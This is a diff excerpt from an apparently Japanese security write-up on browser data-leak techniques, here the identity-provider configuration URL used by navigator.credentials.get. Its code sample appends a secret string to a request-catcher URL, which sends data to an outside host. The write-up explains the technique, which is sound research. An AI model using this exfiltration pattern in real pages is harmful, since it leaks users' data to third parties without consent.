@@ -54,7 +54,7 @@ p.setLocalDescription();
 IdPから構成情報を取得する際のリクエストURLを利用します。認証情報を保存する際のアイコンのURLとして情報を送信する手法も確認されていますが、ユーザにダイアログが出現するため今回はスコープ外とします。セキュアコンテキストでのみ利用できます。
 
 ```js
-await navigator.credentials.get({
+navigator.credentials.get({
     identity: {
         providers: [{
             configURL: "https://enbx53nv6g23p.x.pipedream.net/?text=" + "Satoki_no_himitsu",
